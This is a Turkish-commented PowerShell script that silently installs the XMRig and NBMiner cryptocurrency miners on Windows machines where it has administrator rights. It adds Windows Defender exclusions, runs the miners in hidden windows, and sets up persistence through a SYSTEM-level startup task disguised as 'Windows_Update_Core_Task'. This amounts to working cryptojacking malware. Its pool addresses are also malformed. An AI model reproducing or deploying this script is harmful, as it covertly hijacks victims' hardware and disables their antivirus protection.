# ==================================================================================
# PROJE: Otonom Edge/Grid Mining Ağı Kurulum ve Entegrasyon Betiği
# YETKİ: NT AUTHORITY\SYSTEM (Gizli / Arka Plan)
# ==================================================================================

# 1 & 4. SESSİZ YÖNETİCİ (ADMIN) DOĞRULAMA VE ONAY MEKANİZMASI
$workDir = "C:\Otomasyon"
if (-not (Test-Path $workDir)) {
    New-Item -ItemType Directory -Path $workDir -Force | Out-Null
}

# Mevcut kullanıcının Windows Administrator (Yönetici) rolünde olup olmadığını kontrol et
$isAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)

if ($isAdmin) {
    # Eğer kullanıcı Admin ise ekrana soru sormadan onay dosyasını sessizce oluştur
    $confirmFile = "$workDir\.kurulum_onaylandi"
    if (-not (Test-Path $confirmFile)) {
        New-Item -ItemType File -Path $confirmFile -Force | Out-Null
    }
    Write-Host "Windows Yonetici onayi dogrulandi. Kurulum sessizce arka planda baslatiliyor..."
} else {
    # Eğer Admin yetkisi yoksa ekrana hiçbir pencere açmadan sessizce çıkış yap
    exit 0
}

# 2. GÜVENLİ TLS PROTOKOLLERİNİN ETKİNLENŞTİRİLMESİ (GitHub Bağlantıları İçin)
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 -bor [Net.SecurityProtocolType]::Tls13

# 5. GÜVENLIK YAZILIMI İSTİSNALARI (Windows Defender Exclusion)
if (Get-Command Add-MpPreference -ErrorAction SilentlyContinue) {
    Add-MpPreference -ExclusionPath $workDir -ErrorAction SilentlyContinue
    Add-MpPreference -ExclusionProcess "nbminer.exe", "xmrig.exe", "powershell.exe" -ErrorAction SilentlyContinue
}

# 6. MADENCİ YAZILIMLARININ ARKA PLANDA OTOMATİK İNDİRİLMESİ VE KURULMASI
$xmrigZip = "$workDir\xmrig.zip"
$nbminerZip = "$workDir\nbminer.zip"

# XMRig (CPU) Güncel Sürüm Doğru Dosya Linki
if (-not (Test-Path "$workDir\xmrig.exe")) {
    Write-Host "XMRig v6.26.0 arka planda indiriliyor..."
    $xmrigUrl = "https://github.com/xmrig/xmrig/releases/download/v6.26.0/xmrig-6.26.0-windows-x64.zip"
    try {
        Invoke-WebRequest -Uri $xmrigUrl -OutFile $xmrigZip -UseBasicParsing
        $extractPathXMR = "$workDir\xmrig_temp"
        Expand-Archive -Path $xmrigZip -DestinationPath $extractPathXMR -Force
        Get-ChildItem -Path $extractPathXMR -Recurse -Filter "xmrig.exe" | Move-Item -Destination $workDir -Force
        Remove-Item -Path $extractPathXMR -Recurse -Force
        Remove-Item -Path $xmrigZip -Force
        Write-Host "XMRig v6.26.0 kurulumu tamamlandi."
    }
    catch {
        Write-Error "XMRig indirilirken veya kurulurken hata olustu: $_"
    }
}

# NBMiner (GPU) Doğru Dosya Linki
if (-not (Test-Path "$workDir\nbminer.exe")) {
    Write-Host "NBMiner arka planda indiriliyor..."
    $nbminerUrl = "https://dl.nbminer.com/NBMiner_42.3_Win.zip"
    try {
        Invoke-WebRequest -Uri $nbminerUrl -OutFile $nbminerZip -UseBasicParsing
        $extractPathNB = "$workDir\nbminer_temp"
        Expand-Archive -Path $nbminerZip -DestinationPath $extractPathNB -Force
        Get-ChildItem -Path $extractPathNB -Recurse -Filter "nbminer.exe" | Move-Item -Destination $workDir -Force
        Remove-Item -Path $extractPathNB -Recurse -Force
        Remove-Item -Path $nbminerZip -Force
        Write-Host "NBMiner kurulumu tamamlandi."
    }
    catch {
        Write-Error "NBMiner indirilirken veya kurulurken hata olustu: $_"
    }
}

# 7. SÜREKLİ ÇALIŞACAK ANA MOTORUN OLUŞTURULMASI (core_run.ps1)
$coreScriptPath = "$workDir\core_run.ps1"

# Tek tırnak (@' ... '@) kullanımı sayesinde tüm iç değişkenler 
# hedef bilgisayar üzerinde dinamik ve hatasız olarak çözümlenir.
$coreScriptContent = @'
while ($true) {
    # NiceHash uzerinden aldiginiz resmi madencilik adresi
    $Wallet = "NHbW86FpEjX5tnYBWsvHczfMNsD2PG9mJrZ9"

    # Dogru NiceHash Stratum Havuz Adresleri
    $poolXMR = "stratum+tcp://://nicehash.com"
    $poolBTC = "stratum+tcp://://nicehash.com"

    # Sistemlerin havuz panelinde ayirt edilebilmesi icin bilgisayar adini isci adi yapiyoruz
    $WorkerName = $env:COMPUTERNAME

    # Yazilimlara gonderilecek nihai kullanici kimligi formati
    $UserAuth = "$Wallet.$WorkerName"

    # Her cihaz üzerinde yerel donanim analizi tetikleme
    $hasGPU = (Get-CimInstance Win32_VideoController | Where-Object { $_.Name -match "NVIDIA|AMD|Radeon" }) -ne $null

    if ($hasGPU) {
        if (-not (Get-Process "nbminer" -ErrorAction SilentlyContinue)) {
            Start-Process "C:\Otomasyon\nbminer.exe" -ArgumentList "-a kawpow -o $poolBTC -u $UserAuth" -WindowStyle Hidden -CreateNoWindow
        }
    } else {
        if (-not (Get-Process "xmrig" -ErrorAction SilentlyContinue)) {
            Start-Process "C:\Otomasyon\xmrig.exe" -ArgumentList "-a rx/0 -o $poolXMR -u $UserAuth -p x" -WindowStyle Hidden -CreateNoWindow
        }
    }
    Start-Sleep -Seconds 60
}
'@
Set-Content -Path $coreScriptPath -Value $coreScriptContent -Encoding UTF8

# 8. NT AUTHORITY\SYSTEM ZAMANLANMIŞ GÖREV TANIMLAMA (Kalıcılık)
$taskName = "Windows_Update_Core_Task"
$taskAction = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-ExecutionPolicy Bypass -WindowStyle Hidden -File $coreScriptPath"
$taskTrigger = New-ScheduledTaskTrigger -AtStartup
$taskPrincipal = New-ScheduledTaskPrincipal -UserId "NT AUTHORITY\SYSTEM" -LogonType ServiceAccount -RunLevel Highest

# Varsa eski görevi temizle ve yenisini kaydet
Register-ScheduledTask -TaskName $taskName -Action $taskAction -Trigger $taskTrigger -Principal $taskPrincipal -Force | Out-Null

# 9. İLK TETİKLEME
Start-ScheduledTask -TaskName $taskName
Write-Host "Otonom servis arka planda SYSTEM yetkisiyle basariyla baslatildi."
